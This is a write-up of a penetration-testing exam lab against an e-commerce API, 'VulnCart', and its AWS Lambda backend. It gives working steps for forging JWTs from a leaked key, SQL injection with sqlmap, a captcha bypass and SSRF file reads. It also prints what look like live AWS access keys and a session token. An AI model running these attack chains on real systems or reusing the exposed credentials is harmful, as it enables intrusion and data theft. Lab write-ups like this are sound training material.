---
title: "API-RTA"
description: "CloudAPI"
icon: "article"
date: "2025-12-28"
lastmod: "2025-12-28"
draft: false
toc: true
weight: 999
---

`exploit APIs in cloud with no-prep? sign me up!`

{{< figure src="image.png" alt="image" >}}

The exam dropped us into a public-facing web-app and let us loose - enumeration and exploitation flowed naturally, the questions not so much.

```xml
Author: Abu
Date: 28-12-2025
Exam Type: API Penetration Testing & Cloud Security  
```

### **Executive Summary**

The VulnCart API Security Assessment exam presented a comprehensive e-commerce application penetration testing scenario requiring exploitation across multiple attack vectors including authentication bypass, SQL injection, server-side request forgery, and cloud infrastructure compromise. Starting with anonymous access to http://34.100.175.35:30516, I systematically mapped the application architecture, discovered the JWT signing key through JWKS endpoint enumeration, bypassed client-side captcha validation to redeem gift cards, exploited SQL injection vulnerabilities to extract the complete database including 500 demo user accounts and hidden product information, leveraged SSRF vulnerabilities in AWS Lambda functions to extract IAM credentials from environment variables, accessed misconfigured S3 buckets to retrieve sensitive payment card data, and identified critical business logic flaws in pricing validation allowing unauthorized discounts on products. The attack chain progressed from initial reconnaissance through web application exploitation, database compromise, cloud service enumeration, credential theft, and ultimately sensitive data exfiltration, demonstrating how multiple security weaknesses compound to enable complete application and infrastructure compromise in cloud-native architectures.

### Report

**`Initial Reconnaissance:`**

- Target: http://34.100.175.35:30516
- Architecture: Flask/Python backend with SQLite database
- Authentication: JWT tokens with custom implementation
- Cloud Integration: AWS Lambda + S3 bucket storage
- Payment System: Gift card redemption with captcha validation

{{< figure src="image 1.png" alt="image 1" >}}

Through systematic browsing, JavaScript file analysis, and directory enumeration, I mapped the complete application structure.

```xml
/static/index.html
/static/login.html
/dashboard
/products
/wallet
/checkout
/cart
GET    /api/v1/demo-users
GET    /api/v1/products/search
GET    /api/v1/cart
POST   /api/v1/cart
POST   /api/v1/orders
GET    /api/v1/orders/track
POST   /api/v1/payments/giftcard
GET    /api/v1/profile/me
```

**AWS Lambda Integration Endpoints:**

```xml
https://cbaxikgibt5s4q26bqrwnzc5ay0kfyor.lambda-url.ap-south-1.on.aws/debug
https://cbaxikgibt5s4q26bqrwnzc5ay0kfyor.lambda-url.ap-south-1.on.aws/fetch_order_status
https://cbaxikgibt5s4q26bqrwnzc5ay0kfyor.lambda-url.ap-south-1.on.aws/validate
```

While exploring common security-related endpoints (always check `/.well-known/` directories!), I tried accessing the JWKS (JSON Web Key Set) endpoint and hit gold.

`/.well-known/jwks.json`

```xml
┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/Projects/Lotus]
└─$ curl http://34.100.175.35:30516/.well-known/openid-configuration | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   163 100   163   0     0  2443     0  --:--:-- --:--:-- --:--:--  2469
{
  "id_token_signing_alg_values_supported": [
    "HS256"
  ],
  "issuer": "https://vulncart.internal",
  "jwks_uri": "/.well-known/jwks.json",
  "token_endpoint": "/api/v1/auth/login"
}

┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/Projects/Lotus]
└─$ curl http://34.100.175.35:30516/.well-known/jwks.json | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    78 100    78   0     0  1208     0  --:--:-- --:--:-- --:--:--  1218
{
  "keys": [
    {
      "k": "dnVsbmNhcnQtdXNlci1zZWNyZXQ",
      "kid": "user-key-1",
      "kty": "oct"
    }
  ]
}
```

The `kty: "oct"` indicated an **octet sequence (symmetric key)**, and the base64-encoded value in the `k` field was the actual signing secret.

```
echo "dnVsbmNhcnQtdXNlci1zZWNyZXQ" | base64 -d
# Output: vulncart-user-secret
```

`Forge`

```python
import jwt
import time
import sys

secret = "vulncart-user-secret"
user_id = int(sys.argv[1]) if len(sys.argv) > 1 else 500

# Minimal payload - only user_id actually matters!
# Backend ignores role/scope and uses database values instead
payload = {
    "iss": "https://vulncart.internal",
    "sub": f"user{user_id}",
    "user_id": user_id,  # ← This is the ONLY field that matters
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

`Duplication`

```python
┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/Exams/API]
└─$ curl -H "Authorization: Bearer $TOKEN" http://34.100.175.35:30516/api/v1/users/me
{"balance":0,"email":"anonymous","id":0,"role":"anonymous"}

┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/Exams/API]
└─$ python3 create_jwt.py 500 user
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL3Z1bG5jYXJ0LmludGVybmFsIiwic3ViIjoidXNlcjUwMCIsInVzZXJfaWQiOjUwMCwiaWF0IjoxNzY2OTM2NDU2LCJleHAiOjE3NjY5NDAwNTZ9.QaPlw-_-W3wJPS9dJbuCAOJrLdsEIEw45YgD-9BuF2c

┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/Exams/API]
└─$ TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL3Z1bG5jYXJ0LmludGVybmFsIiwic3ViIjoidXNlcjUwMCIsInVzZXJfaWQiOjUwMCwiaWF0IjoxNzY2OTM2NDU2LCJleHAiOjE3NjY5NDAwNTZ9.QaPlw-_-W3wJPS9dJbuCAOJrLdsEIEw45YgD-9BuF2c

┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/Exams/API]
└─$ curl -H "Authorization: Bearer $TOKEN" http://34.100.175.35:30516/api/v1/users/me
{"balance":147129.64199999996,"email":"user500@vulncart.internal","id":500,"role":"user"}
```

`Demo User Account Enumeration`

The application contained 500 pre-created demo accounts for testing purposes. I enumerated all accounts to understand user distribution and identify accounts with useful states like balances and gift card redemptions.

```python
curl -H "Authorization: Bearer $TOKEN" \
  http://34.100.175.35:30516/api/v1/demo-users | jq '.'
```

`Initial SQL Injection Discovery`

While testing the product search functionality, I noticed the endpoint `/api/v1/products/search?name=*` returned all products. This wildcard behavior suggested direct query construction without proper parameterization.

`SQLMap`

```python
sqlmap -u 'http://34.100.175.35:30516/api/v1/products/search?name=*' --risk 3 --level 5 --dump
```

{{< figure src="image 2.png" alt="image 2" >}}

**Hidden Product:** ID 1337 "Hack Me Not" with `visible=0`

```python
└─$ cat /home/abu/.local/share/sqlmap/output/34.100.175.35/dump/SQLite_masterdb/products.csv
id,name,price,visible
1,T-Shirt,31337,1
2,Shoes,31337,1
1337,Hack Me Not,1000,0
```

`Payment Page Analysis`

Accessing the checkout page revealed a gift card redemption feature protected by a client-side captcha.

```python
<div id="giftcard-section">
  <h3>Redeem Gift Card</h3>
  <input type="text" id="gift-code" placeholder="GIFT-XXXXXXXXX">
  <div id="captcha-challenge">
    <p>Solve: <span id="captcha-question"></span></p>
    <input type="number" id="captcha-answer">
  </div>
  <button onclick="submitGiftCard()">Redeem</button>
</div>
```

Captcha Implementation Analysis

Examining the `/static/payment.html` source revealed the complete client-side captcha logic.

```python
function generateCaptcha() {
  const a = Math.floor(Math.random() * 10) + 1;
  const b = Math.floor(Math.random() * 10) + 1;
  const answer = a + b;
  
  document.getElementById('captcha-question').innerText = `${a} + ${b} = ?`;
  document.getElementById('answer').value = answer;
}
```

The JavaScript sent BOTH the user's captcha response AND the correct answer to the server. The backend merely validated if `captcha === answer`, without maintaining any server-side challenge state.

Gift Card Code Generation Algorithm

The payment.html source also revealed how gift card codes were generated.

```python
const generationTable = {
  "v": "3",
  "u": "1", 
  "l": "2",
  "n": "a",
  "c": "9",
  "a": "7",
  "r": "5",
  "t": "a"
};

function generateGiftCode(seed) {
  let result = "GIFT-";
  for (let char of seed.toLowerCase()) {
    result += generationTable[char] || char;
  }
  result += "994e";
  return result;
}
```

`"vulncart" → "GIFT-312a975a994e"`

`v→3, u→1, l→2, n→a, c→9, a→7, r→5, t→a, +994e`

This deterministic algorithm meant gift card codes were predictable if you knew the seed word. The seed "vulncart" generated the code we found in the database.

**Captcha Bypass Exploitation**

```bash
curl -X POST "http://34.100.175.35:30516/api/v1/payments/giftcard" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "code": "GIFT-312a975a994e",
    "captcha": 10,
    "answer": 10
  }'
```

`{
"added": 100,
"status": "success"
}`

By sending identical values for `captcha` and `answer`, the validation passed regardless of the actual challenge. The server never tracked what challenge was issued, making the captcha completely ineffective.

**`AWS Lambda Discovery & Enumeration`**

After redeeming the gift card, I tested the complete purchase workflow to understand order processing.

```bash
└─$ curl -X POST "http://34.100.175.35:30516/api/v1/orders" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "product_id": 1,
    "quantity": 1,
    "price": 100
  }'
{"order_status":"https://cbaxikgibt5s4q26bqrwnzc5ay0kfyor.lambda-url.ap-south-1.on.aws/fetch_order_status","paid":100.0,"product_id":1,"status":"Order placed"}
```

This revealed the application used `AWS Lambda` for order status processing. The Lambda function URL followed the pattern:

```
https://<function-id>.lambda-url.<region>.on.aws/<path>
```

`/debug`

```bash
┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/Exams/API]
└─$ curl https://cbaxikgibt5s4q26bqrwnzc5ay0kfyor.lambda-url.ap-south-1.on.aws/debug
{
  "aws_account_id": "367185498861",
  "bucket_name": "api-rta-exam-bucket-2df3f88b8f9b",
  "lambda_arn": "arn:aws:lambda:ap-south-1:367185498861:function:API-RTA-Exam-Lab",
  "region": "ap-south-1",
  "environment_variables": {
    "AWS_LAMBDA_FUNCTION_VERSION": "$LATEST",
    "AWS_EXECUTION_ENV": "AWS_Lambda_python3.14",
    "AWS_DEFAULT_REGION": "ap-south-1",
    "AWS_LAMBDA_LOG_STREAM_NAME": "2025/12/28/[$LATEST]b33e12be6c054d53918d3142fbea7cef",
    "AWS_REGION": "ap-south-1",
    "PWD": "/var/task",
    "_HANDLER": "lambda_function.lambda_handler",
    "TZ": ":UTC",
    "LAMBDA_TASK_ROOT": "/var/task",
    "LANG": "en_US.UTF-8",
    "AWS_LAMBDA_LOG_GROUP_NAME": "/aws/lambda/API-RTA-Exam-Lab",
    "BUCKET_NAME": "api-rta-exam-bucket-2df3f88b8f9b",
    "AWS_LAMBDA_RUNTIME_API": "169.254.100.1:9001",
    "AWS_LAMBDA_FUNCTION_MEMORY_SIZE": "128",
    "LAMBDA_RUNTIME_DIR": "/var/runtime",
    "_AWS_XRAY_DAEMON_ADDRESS": "169.254.100.1",
    "AWS_XRAY_DAEMON_ADDRESS": "169.254.100.1:2000",
    "SHLVL": "0",
    "LD_LIBRARY_PATH": "/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib",
    "AWS_LAMBDA_FUNCTION_NAME": "API-RTA-Exam-Lab",
    "PATH": "/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin",
    "AWS_LAMBDA_INITIALIZATION_TYPE": "on-demand",
    "AWS_SESSION_TOKEN": "IQoJb3JpZ2luX2VjEMD//////////wEaCmFwLXNvdXRoLTEiRjBEAiBY9XIN3nsAZRdOsaVG+tJQvTBr/cLZ2WrTwCf0I0I8hAIgSRNrpUxNrAuaFtfqUKqNvG58c29HyGxMKpMPTKEoONYq/gIIif//////////ARAAGgwzNjcxODU0OTg4NjEiDEqri0hB3/GJec8QrirSAjzP0yHPydttVdvqYAaKnhiSX7jFvNVrKYNDtAYdonIQUYrY+8lfcQkK58DDM0rgEzcHzyfRpugZ15Wjrt+B+sVJCHlGxMwZbKrfGwk+4kQWjQ43iwRYu0P/8nwzLBcCuNQ91cESLMyMw1MTGy0trxymcyru2ev1xXXWcYwFhQ+YGByRnkovyRS8mPSUIU0V4FO0S9vIpHzZAQm2lOwVkfMINqKia7lZ0nqqk2C68Giqf+hSJRmfoqldnUHaHBWbKRl0TW1dyfPhvIns8ppxFKfBxLArZCv7brpYygEtr5j56CivLk2jbwrfeDtPvVj3lJutWdJKQXqZmvKS3saPOlTH0OWy3u0FqukPsBUJ1CIfou7ayEtBwH8NfM+Q12yU36c0R787xUq4zKx1zFR9OuCygx05T6++eJwar5orb0UUFEew/PwkYrJvsOCa8vteSrgCMMGkxcoGOp8Bk/ZdQ4ESmKsXyNAUKr/nVr0KoCsXvzZTww8ZTSVvZXFS9TLgJuGPLeHE0A8zAqdO0d2C+QQyEGmzmgllLXTI/swx6llF2qisrVH6q2ZpgoUVl0n/Mlb2JrCz7IbD1/vX+OytZTZPE1MO5D250fLxlDoufcv/POSlKJMvcqp0l5/fv2XHvhgdoOniClpp7NJ+nGkxRuZwYJ//N1SlCa5s",
    "AWS_XRAY_CONTEXT_MISSING": "LOG_ERROR",
    "_AWS_XRAY_DAEMON_PORT": "2000",
    "LC_CTYPE": "C.UTF-8",
    "PYTHONPATH": "/var/runtime",
    "_X_AMZN_TRACE_ID": "Root=1-69515241-3118583a55dc72d801529260;Parent=26abaf9cdeeec409;Sampled=0;Lineage=1:deb21ef2:0"
  }
}
```

The `/debug` endpoint revealed the S3 bucket name but filtered out the AWS credentials. I could see WHAT resources existed but not HOW to access them. I needed another approach to obtain credentials.

`Critical Discovery - /validate Endpoint`

```bash
curl "$LAMBDA/validate" -X POST \
  -H "Content-Type: application/json" \
  -d '{"url":"http://example.com"}'
```

The endpoint accepted a `url` parameter and returned content, suggesting potential SSRF!

With the `/validate` endpoint accepting URL parameters, I tested if it would fetch arbitrary resources.

{{< figure src="image 3.png" alt="image 3" >}}

**Extracted Credentials:**

- **Access Key ID:** ASIAVK7PWCLW7K5AMFYQ
- **Secret Access Key:** 9KuMgb7/gHIhGG7q1csnSJpcHTp3/smV6zgcf+xy

With SSRF access, I could read the Lambda function's source code.

```python
┌──(omni)(abu㉿Winbu)-[/mnt/c/Main/CyberSec/Exams/API]
└─$ curl -s -X POST "$LAMBDA/validate" \
  -H "Content-Type: application/json" \
  -d '{"url":"file:///var/task/lambda_function.py"}'
import json
import boto3
import os
import urllib.request
from datetime import datetime
from decimal import Decimal

s3 = boto3.client('s3')
sts = boto3.client('sts')

BUCKET_NAME = os.environ.get('BUCKET_NAME', '')

def json_default(obj):
    if isinstance(obj, Decimal):
        if obj % 1 == 0:
            return int(obj)
        else:
            return float(obj)
    raise TypeError

def lambda_handler(event, context):
    try:
        http_method = (
    event.get('httpMethod') or
    event.get('requestContext', {}).get('http', {}).get('method') or
    'GET'
)

        path = event.get('path') or event.get('rawPath') or ''

        query_params = event.get('queryStringParameters') or {}
        headers = event.get('headers') or {}

        print(f"Processing: {http_method} {path}")

        if path.endswith('/fetch_order_status') and http_method == 'GET':
            params = query_params
            file_path = params.get('path', 'orders/order_status.json')

            response = s3.get_object(Bucket=BUCKET_NAME, Key=file_path)
            raw_content = response['Body'].read().decode('utf-8')

            try:
                parsed_content = json.loads(raw_content)
            except json.JSONDecodeError as e:
                return {
                    "statusCode": 500,
                    "headers": {
                        "Access-Control-Allow-Origin": "*"
                    },
                    "body": json.dumps({
                        "error": "Invalid JSON file",
                        "details": str(e)
                    })
                }

            return {
                "statusCode": 200,
                "headers": {
                    "Content-Type": "application/json",
                    "Access-Control-Allow-Origin": "*",
                    "Access-Control-Allow-Credentials": "true"
                },
                "body": json.dumps({
                    "content": parsed_content,
                    "path": file_path
                })
            }

        elif http_method == 'OPTIONS':
            origin = headers.get('origin', '*')

            return {
                'statusCode': 200,
                'headers': {
                    'Access-Control-Allow-Origin': origin,
                    'Access-Control-Allow-Methods': '*',
                    'Access-Control-Allow-Headers': '*',
                    'Access-Control-Allow-Credentials': 'true',
                    'Access-Control-Max-Age': '86400'
                },
                'body': ''
            }

        elif path.endswith('/validate') and http_method == 'POST':

            body = json.loads(event.get('body') or '{}')
            url = body.get('url', '')

            req = urllib.request.Request(url)
            response = urllib.request.urlopen(req, timeout=5)
            external_content = response.read().decode('utf-8', errors='ignore')

            return {
                "statusCode": 200,
                "headers": {
                    "Content-Type": "text/plain; charset=utf-8"
                },
                "body": external_content
            }

        elif path.endswith('/debug') and http_method == 'GET':
            debug_info = {
                'aws_account_id': sts.get_caller_identity()['Account'],
                'bucket_name': BUCKET_NAME,
                'lambda_arn': context.invoked_function_arn,
                'region': os.environ.get('AWS_REGION'),
                'environment_variables': {
                    k: v for k, v in os.environ.items()
                    if 'KEY' not in k and 'SECRET' not in k
                }
            }

            return {
                'statusCode': 200,
                'body': json.dumps(debug_info, indent=2)
            }

        else:
            print(f"No handler found for: {http_method} {path}")
            return {
                'statusCode': 404,
                'body': json.dumps({'error': 'Not Found', 'path': path, 'method': http_method})
            }

    except Exception as e:
        print(f"Error: {str(e)}")
        return {
            'statusCode': 500,
            'body': json.dumps({'error': str(e)})
```

The `/validate` endpoint used `urllib.request.urlopen()` without any URL validation, allowing:

- File reads via  protocol
- Internal network access via `http://`
- No allow-list or deny-list filtering
- No timeout protection (5 seconds)

With extracted credentials, I configured AWS CLI for direct bucket access.

{{< figure src="image 4.png" alt="image 4" >}}

### Resources

[Finding Unused IAM Credentials (AWS Access Keys)](https://cagrihankara.medium.com/finding-unused-iam-credentials-aws-access-keys-1ca56e323602)

[Hacking AWS Lambda for security, fun and profit](https://blog.appsecco.com/hacking-aws-lambda-for-security-fun-and-profit-c140426b6167)

[Hacking AWS: HackerOne & AWS CTF 2021 writeup](https://www.pkusinski.com/hackerone-aws-ctf-2021-writeup/)

[Steal IAM Credentials and Event Data from Lambda - Hacking The Cloud](https://hackingthe.cloud/aws/exploitation/lambda-steal-iam-credentials/)